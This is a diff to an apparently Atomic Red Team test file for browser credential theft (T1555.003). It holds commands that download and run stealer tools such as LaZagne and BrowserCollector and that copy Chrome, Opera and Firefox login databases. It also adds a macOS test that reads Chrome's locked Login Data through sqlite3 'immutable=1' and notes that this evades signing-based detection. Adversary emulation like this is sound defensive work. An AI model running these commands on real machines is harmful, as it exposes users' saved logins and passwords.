@@ -25,7 +25,7 @@ atomic_tests:
     get_prereq_command: |
       New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction ignore -Force | Out-Null
       [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-      Invoke-WebRequest "https://github.com/mitre-attack/attack-arsenal/raw/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/Modified-SysInternalsSuite.zip" -OutFile "#{file_path}\Modified-SysInternalsSuite.zip" -UseBasicParsing
+      Invoke-WebRequest "https://github.com/mitre-attack/attack-arsenal/raw/66650cebd33b9a1e180f7b31261da1789cdceb66/adversary_emulation/APT29/CALDERA_DIY/evals/payloads/Modified-SysInternalsSuite.zip" -OutFile "#{file_path}\Modified-SysInternalsSuite.zip"
       Expand-Archive "#{file_path}\Modified-SysInternalsSuite.zip" "#{file_path}\sysinternals" -Force
       Remove-Item "#{file_path}\Modified-SysInternalsSuite.zip" -Force
   executor:
@@ -72,7 +72,7 @@ atomic_tests:
       if (Test-Path "#{lazagne_path}") {exit 0} else {exit 1}
     get_prereq_command: |
       New-Item -Type Directory (split-path "#{lazagne_path}") -ErrorAction ignore | Out-Null
-      Invoke-WebRequest "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe" -OutFile "#{lazagne_path}" -UseBasicParsing
+      Invoke-WebRequest "https://github.com/AlessandroZ/LaZagne/releases/download/v2.4.5/LaZagne.exe" -OutFile "#{lazagne_path}"
   executor:
     name: command_prompt
     elevation_required: true
@@ -88,22 +88,47 @@ atomic_tests:
   dependencies:
   - description: |
       Chrome must be installed
-    prereq_command: 'if ((Test-Path "C:\Program Files\Google\Chrome\Application\chrome.exe") -Or (Test-Path "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe")) {exit 0} else {exit 1}'
+    prereq_command: |
+      if ((Test-Path "C:\Program Files\Google\Chrome\Application\chrome.exe") -Or (Test-Path "C:\Program Files (x86)\Google\Chrome\Application\chrome.exe")) {exit 0} else {exit 1}
     get_prereq_command: |
-      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
-      $installer = "PathToAtomicsFolder\..\ExternalPayloads\ChromeStandaloneSetup64.msi"
-      Invoke-WebRequest -OutFile "PathToAtomicsFolder\..\ExternalPayloads\ChromeStandaloneSetup64.msi" https://dl.google.com/chrome/install/googlechromestandaloneenterprise64.msi -UseBasicParsing
-      msiexec /i $installer /qn
-      Start-Process -FilePath "chrome.exe"
+      if (!(Test-Path "#{installer_path}")){
+        $parentpath = Split-Path "#{installer_path}"
+        New-Item -Type Directory "$parentpath" -ErrorAction Ignore -Force | Out-Null
+        (New-Object Net.WebClient).DownloadFile("#{download_url}","#{installer_path}")
+      }
+      $path = Convert-Path -LiteralPath "#{installer_path}"
+      msiexec.exe /i "$path" /qn
+      Start-Sleep -Seconds 100
+      Start-Process -FilePath "C:\Program Files\Google\Chrome\Application\chrome.exe"
       Stop-Process -Name "chrome"
+  - description: |
+      Chrome login data file must exist
+    prereq_command: 'if ((Test-Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data") -and (Test-Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data For Account")) {exit 0} else {exit 1}'
+    get_prereq_command: |
+      New-Item -Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default" -ItemType Directory -Force -ErrorAction SilentlyContinue
+      New-Item -Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" -ItemType File -Force -ErrorAction SilentlyContinue
+      New-Item -Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data For Account" -ItemType File -Force -ErrorAction SilentlyContinue
+  input_arguments:
+    installer_path:
+      description: where the installer will be downloaded to or already is located
+      type: path
+      default: PathToAtomicsFolder\..\ExternalPayloads\ChromeStandaloneSetup64.msi
+
+    download_url:
+      description: url to install Chrome from
+      type: url
+      default: https://dl.google.com/chrome/install/googlechromestandaloneenterprise64.msi
   executor:
     name: powershell
     command: |
       Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data" -Destination "PathToAtomicsFolder\..\ExternalPayloads"
       Copy-Item "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data For Account" -Destination "PathToAtomicsFolder\..\ExternalPayloads"
     cleanup_command: |
+      Get-Package -Name "Google Chrome" | Uninstall-Package -Force
       Remove-Item -Path "PathToAtomicsFolder\..\ExternalPayloads\Login Data" -Force -ErrorAction Ignore
       Remove-Item -Path "PathToAtomicsFolder\..\ExternalPayloads\Login Data For Account" -Force -ErrorAction Ignore
+      Remove-Item -Path "$env:LOCALAPPDATA\Google" -Force -Recurse -ErrorAction Ignore
+      Remove-Item "#{installer_path}" -ErrorAction Ignore
 - name: Simulating access to Opera Login Data
   auto_generated_guid: 28498c17-57e4-495a-b0be-cc1e36de408b
   description: |
@@ -114,25 +139,48 @@ atomic_tests:
   dependencies:
   - description: |
       Opera must be installed
-    prereq_command: 'if (((Test-Path "$env:LOCALAPPDATA\Programs\Opera\launcher.exe") -Or (Test-Path "C:\Program Files\Opera\launcher.exe") -Or (Test-Path "C:\Program Files (x86)\Opera\launcher.exe"))) {exit 0} else {exit 1}'
+    prereq_command: 'if (Test-Path "#{installer_path}/../opera.exe")  {exit 0} else {exit 1}'
     get_prereq_command: |
-      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
-      $installer = "PathToAtomicsFolder\..\ExternalPayloads\OperaStandaloneInstaller.exe"
-      Invoke-WebRequest -OutFile "PathToAtomicsFolder\..\ExternalPayloads\OperaStandaloneInstaller.exe" https://get.geo.opera.com/pub/opera/desktop/82.0.4227.43/win/Opera_82.0.4227.43_Setup.exe -UseBasicParsing
-      Start-Process $installer -ArgumentList '/install /silent /launchopera=1 /setdefaultbrowser=0'
-      Start-Sleep -s 180
+      if (!(Test-Path "#{installer_path}")){
+        $parentpath = Split-Path "#{installer_path}"
+        New-Item -Type Directory "$parentpath" -ErrorAction Ignore -Force | Out-Null
+        (New-Object Net.WebClient).DownloadFile("#{download_url}","#{installer_path}")
+      }
+      $path = Convert-Path -LiteralPath "#{installer_path}"
+      Start-Process $path -ArgumentList '/install /silent /launchopera=1 /setdefaultbrowser=0'
+      Start-Sleep -s 120
       Stop-Process -Name "opera"
   - description: |
       Opera login data file must exist
     prereq_command: 'if (Test-Path "$env:APPDATA\Opera Software\Opera Stable\Login Data") {exit 0} else {exit 1}'
     get_prereq_command: |
       New-Item -Path "$env:APPDATA\Opera Software\Opera Stable\Login Data" -ItemType File
+
+  input_arguments:
+    installer_path:
+      description: where the installer will be downloaded to or already is located
+      type: path
+      default: PathToAtomicsFolder\..\ExternalPayloads\OperaStandaloneInstaller.exe
+
+    download_url:
+      description: url to install Opera from
+      type: url
+      default: https://get.geo.opera.com/pub/opera/desktop/82.0.4227.43/win/Opera_82.0.4227.43_Setup.exe
   executor:
     name: powershell
     command: |
       Copy-Item "$env:APPDATA\Opera Software\Opera Stable\Login Data" -Destination "PathToAtomicsFolder\..\ExternalPayloads"
     cleanup_command: |
-      Remove-Item -Path "PathToAtomicsFolder\..\ExternalPayloads\Login Data" -Force -ErrorAction Ignore
+      Remove-Item -Path "PathToAtomicsFolder\..\ExternalPayloads\Login Data" -Force -ErrorAction SilentlyContinue
+      $parent_dir = Split-Path "#{installer_path}"
+      Start-Process -FilePath "$parent_dir/opera.exe" -ArgumentList "--uninstall --runimmediately --deleteuserprofile=1" -Wait
+      Remove-Item -Path "$parent_dir/82.0.4227.43" -Recurse -Force -ErrorAction SilentlyContinue
+      Remove-Item -Path "$parent_dir/assistant" -Recurse -Force -ErrorAction SilentlyContinue
+      Remove-Item -Path "$parent_dir/installer_prefs*" -Recurse -Force -ErrorAction SilentlyContinue
+      Remove-Item -Path "$parent_dir/server_tracking_data" -Recurse -Force -ErrorAction SilentlyContinue
+      Remove-Item -Path "$parent_dir/launcher.exe" -Recurse -Force -ErrorAction SilentlyContinue
+      Remove-Item -Path "#{installer_path}" -Recurse -Force -ErrorAction SilentlyContinue
+      Remove-Item -Path "C:\Program Files (x86)\Opera" -Recurse -Force -ErrorAction SilentlyContinue
 - name: Simulating access to Windows Firefox Login Data
   auto_generated_guid: eb8da98a-2e16-4551-b3dd-83de49baa14c
   description: |
@@ -144,28 +192,40 @@ atomic_tests:
   dependencies:
   - description: |
       Firefox must be installed
-    prereq_command: 'if ((Test-Path "C:\Program Files\Mozilla Firefox\firefox.exe") -Or (Test-Path "C:\Program Files (x86)\Mozilla Firefox\firefox.exe")) {exit 0} else {exit 1}'
+    prereq_command: 'if ((Test-Path "C:\Program Files\Mozilla Firefox\firefox.exe")) {exit 0} else {exit 1}'
     get_prereq_command: |
-      New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
-      if ($env:PROCESSOR_ARCHITECTURE -eq 'AMD64') {$url="https://download.mozilla.org/?product=firefox-latest-ssl&os=win64&lang=en-US"}else {$url="https://download.mozilla.org/?product=firefox-latest-ssl&os=win&lang=en-US"}
-      $installer = "PathToAtomicsFolder\..\ExternalPayloads\firefoxsetup.exe"
-      (New-Object Net.WebClient).DownloadFile($url,$installer)
-      Start-Process $installer -ArgumentList '/S' -Wait
+      if (!(Test-Path "#{installer_path}")){
+          $parentpath = Split-Path "#{installer_path}"
+          New-Item -Type Directory "$parentpath" -ErrorAction Ignore -Force | Out-Null
+          (New-Object Net.WebClient).DownloadFile("#{download_url}","#{installer_path}")
+        }
+      Start-Process "#{installer_path}" -ArgumentList '/silent' -Wait
   - description: |
       Firefox login data file must exist
     prereq_command: 'if (Test-Path "$env:APPDATA\Mozilla\Firefox\Profiles\") {exit 0} else {exit 1}'
     get_prereq_command: |
-      if ($env:PROCESSOR_ARCHITECTURE -eq 'AMD64') {$firefox="C:\Program Files\Mozilla Firefox\firefox.exe"}else {$firefox="C:\Program Files (x86)\Mozilla Firefox\firefox.exe"}
+      $firefox="C:\Program Files\Mozilla Firefox\firefox.exe"
       Start-Process $firefox -ArgumentList '-CreateProfile Atomic' -Wait
       Start-Process $firefox -NoNewWindow
       Start-Sleep -s 20
       Stop-Process -Name firefox
+  input_arguments:
+      installer_path:
+        description: where the installer will be downloaded to or already is located
+        type: path
+        default: PathToAtomicsFolder\..\ExternalPayloads\firefoxsetup.exe
+      download_url:
+        description: url to install Firefox from
+        type: url
+        default: https://download.mozilla.org/?product=firefox-latest-ssl&os=win64&lang=en-US
   executor:
     name: powershell
     command: |
       Copy-Item "$env:APPDATA\Mozilla\Firefox\Profiles\" -Destination "PathToAtomicsFolder\..\ExternalPayloads" -Force -Recurse
     cleanup_command: |
       Remove-Item -Path "PathToAtomicsFolder\..\ExternalPayloads\Profiles" -Force -ErrorAction Ignore -Recurse
+      Start-Process -FilePath "C:\Program Files\Mozilla Firefox\uninstall\helper.exe" -ArgumentList "/S" -Wait
+      Remove-Item -Path "#{installer_path}" -Force -ErrorAction Ignore -Recurse
 - name: Simulating access to Windows Edge Login Data
   auto_generated_guid: a6a5ec26-a2d1-4109-9d35-58b867689329
   description: |
@@ -232,7 +292,7 @@ atomic_tests:
       if (get-childitem -path "$env:appdata\Mozilla\Firefox\Profiles\*.default-release\" -erroraction silentlycontinue) {exit 0} else {exit 1}
     get_prereq_command: |
       New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
-      Invoke-WebRequest "https://ftp.mozilla.org/pub/firefox/releases/98.0/win64/en-US/Firefox%20Setup%2098.0.msi" -outfile "PathToAtomicsFolder\..\ExternalPayloads\firefox.msi" -UseBasicParsing
+      Invoke-WebRequest "https://ftp.mozilla.org/pub/firefox/releases/98.0/win64/en-US/Firefox%20Setup%2098.0.msi" -outfile "PathToAtomicsFolder\..\ExternalPayloads\firefox.msi"
       msiexec.exe /i "PathToAtomicsFolder\..\ExternalPayloads\firefox.msi" /quiet
       sleep -s 30
       start-process "$env:programfiles\Mozilla Firefox\firefox.exe".
@@ -266,7 +326,7 @@ atomic_tests:
       if (Test-Path "#{Firepwd_Path}") {exit 0} else {exit 1}
     get_prereq_command: |
       New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction ignore -Force | Out-Null
-      Invoke-WebRequest "https://raw.githubusercontent.com/lclevy/firepwd/167eabf3b88d5a7ba8b8bc427283f827b6885982/firepwd.py" -outfile "#{Firepwd_Path}" -UseBasicParsing
+      Invoke-WebRequest "https://raw.githubusercontent.com/lclevy/firepwd/167eabf3b88d5a7ba8b8bc427283f827b6885982/firepwd.py" -outfile "#{Firepwd_Path}"
   - description: |
       Pycryptodome library must be installed 
     prereq_command: |
@@ -408,7 +468,7 @@ atomic_tests:
       if (Test-Path "#{webbrowserpassview_path}") {exit 0} else {exit 1}
     get_prereq_command: |
       New-Item -Type Directory "PathToAtomicsFolder\T1555.003\bin\" -ErrorAction ignore -Force | Out-Null
-      Invoke-WebRequest https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1555.003/bin/WebBrowserPassView.exe -OutFile "#{webbrowserpassview_path}" -UseBasicParsing
+      Invoke-WebRequest https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1555.003/bin/WebBrowserPassView.exe -OutFile "#{webbrowserpassview_path}"
   executor:
     command: |
       Start-Process "#{webbrowserpassview_path}"
@@ -432,7 +492,7 @@ atomic_tests:
     get_prereq_command: |
       New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
       $installer = "PathToAtomicsFolder\..\ExternalPayloads\FirefoxStubInstaller.exe"
-      Invoke-WebRequest -OutFile $installer "https://download.mozilla.org/?product=firefox-stub&os=win&lang=en-US" -UseBasicParsing
+      Invoke-WebRequest -OutFile $installer "https://download.mozilla.org/?product=firefox-stub&os=win&lang=en-US"
       Start-Process -FilePath $installer -Wait
       Stop-Process -Name "firefox"
   - description: |
@@ -441,14 +501,14 @@ atomic_tests:
       if (Test-Path "PathToAtomicsFolder\T1555.003\bin\BrowserCollector.exe") {exit 0} else {exit 1}
     get_prereq_command: |-
       New-Item -Type Directory "PathToAtomicsFolder\T1555.003\bin\" -ErrorAction Ignore -Force | Out-Null
-      Invoke-WebRequest "https://github.com/SaulBerrenson/BrowserStealer/releases/download/1.0.0.4/BrowserCollector_x64.exe" -Outfile: "PathToAtomicsFolder\T1555.003\bin\BrowserCollector.exe" -UseBasicParsing
+      Invoke-WebRequest "https://github.com/SaulBerrenson/BrowserStealer/releases/download/1.0.0.4/BrowserCollector_x64.exe" -Outfile: "PathToAtomicsFolder\T1555.003\bin\BrowserCollector.exe"
   - description: |
       Login Data file that is a copy of a Firefox Login Data that contains credentials for the tool to "steal." Must exist at the specified path.
     prereq_command: |-
       if (Test-Path "PathToAtomicsFolder\T1555.003\src\key4.db") {exit 0} else {exit 1}
     get_prereq_command: |-
-      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555.003/src/key4.db?raw=true" -Outfile: "PathToAtomicsFolder\T1555.003\src\key4.db" -UseBasicParsing
-      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555.003/src/logins.json?raw=true" -Outfile: "PathToAtomicsFolder\T1555.003\src\logins.json" -UseBasicParsing 
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555.003/src/key4.db?raw=true" -Outfile: "PathToAtomicsFolder\T1555.003\src\key4.db"
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555.003/src/logins.json?raw=true" -Outfile: "PathToAtomicsFolder\T1555.003\src\logins.json" 
   executor:
     command: |
       $profile = (Gci -filter "*default-release*" -path $env:Appdata\Mozilla\Firefox\Profiles\).FullName
@@ -488,7 +548,7 @@ atomic_tests:
     get_prereq_command: |
       New-Item -Type Directory "PathToAtomicsFolder\..\ExternalPayloads\" -ErrorAction Ignore -Force | Out-Null
       $installer = "PathToAtomicsFolder\..\ExternalPayloads\ChromeStandaloneSetup64.msi"
-      Invoke-WebRequest -OutFile "PathToAtomicsFolder\..\ExternalPayloads\ChromeStandaloneSetup64.msi" https://dl.google.com/chrome/install/googlechromestandaloneenterprise64.msi -UseBasicParsing
+      Invoke-WebRequest -OutFile "PathToAtomicsFolder\..\ExternalPayloads\ChromeStandaloneSetup64.msi" https://dl.google.com/chrome/install/googlechromestandaloneenterprise64.msi
       msiexec /i $installer /qn
       Start-Process -FilePath "chrome.exe"
       Stop-Process -Name "chrome"
@@ -498,3 +558,56 @@ atomic_tests:
       esentutl.exe /y "%LOCALAPPDATA%\Google\Chrome\User Data\Default\Login Data" /d "#{output_path}"
     cleanup_command: |
       del /f /q #{output_path} > nul 2>&1
+- name: Query Chrome Login Data In Place with sqlite3 - MacOS
+  auto_generated_guid: 29d0c390-3cbc-4e4e-a52b-a1350ed836b7
+  description: |
+    Reads Google Chrome's `Login Data` SQLite database in place with the Apple-signed `/usr/bin/sqlite3`
+    binary, instead of copying the database somewhere else first. The saved origin URLs and usernames are
+    written to the output file. Passwords stay in the `password_value` BLOB column and remain encrypted with
+    the Chrome Safe Storage key, so this test collects the credential index rather than plaintext secrets.
+
+    The `?immutable=1` URI parameter is the part that matters. Chrome holds a lock on the database while it
+    is running, and a plain `sqlite3 "<path>" "SELECT ..."` fails with `Error: in prepare, database is locked (5)`.
+    Opening the file through a `file:` URI with `immutable=1` reads it without taking a lock, so the test works
+    against a live browser and does not need to kill Chrome first, which is what the published LOOBins one-liner
+    for Firefox does.
+
+    This matters for detection because `sqlite3` ships with macOS and is signed by Apple, so controls that key
+    on code signing trust or on an unknown binary touching the profile directory do not fire on it.
+
+    [LOOBins sqlite3](https://www.loobins.io/binaries/sqlite3/) documents the same binary being used against
+    browser cookie databases. [Red Canary](https://redcanary.com/blog/threat-intelligence/clipping-silver-sparrows-wings/)
+    documented macOS malware invoking the `sqlite3` CLI, and
+    [Jamf](https://www.jamf.com/blog/crashstealer-macos-infostealer-analysis/) documented a macOS infostealer
+    working around the same database lock through the SQLite backup API.
+
+    Upon successful execution, the output file contains one line per saved login in the form
+    `origin_url|username_value`. If Chrome has no saved logins the file is created and left empty.
+  supported_platforms:
+  - macos
+  input_arguments:
+    chrome_profile:
+      description: Name of the Chrome profile directory to read
+      type: string
+      default: Default
+    output_file:
+      description: Path the query results are written to
+      type: path
+      default: /tmp/T1555.003_chrome_logins.txt
+  dependencies:
+  - description: |
+      Chrome's Login Data database must exist for profile #{chrome_profile}
+    prereq_command: |
+      if [ -f "$HOME/Library/Application Support/Google/Chrome/#{chrome_profile}/Login Data" ]; then exit 0; else exit 1; fi
+    get_prereq_command: |
+       brew install --cask google-chrome
+       xattr -d com.apple.quarantine "/Applications/Google Chrome.app"
+       open -a "Google Chrome" && sleep 5 && killall -KILL "Google Chrome"
+  executor:
+    name: sh
+    elevation_required: false
+    command: |
+      sqlite3 "file:$HOME/Library/Application Support/Google/Chrome/#{chrome_profile}/Login Data?immutable=1" "SELECT origin_url, username_value FROM logins;" > "#{output_file}"
+      cat "#{output_file}"
+    cleanup_command: |
+      rm -f "#{output_file}"
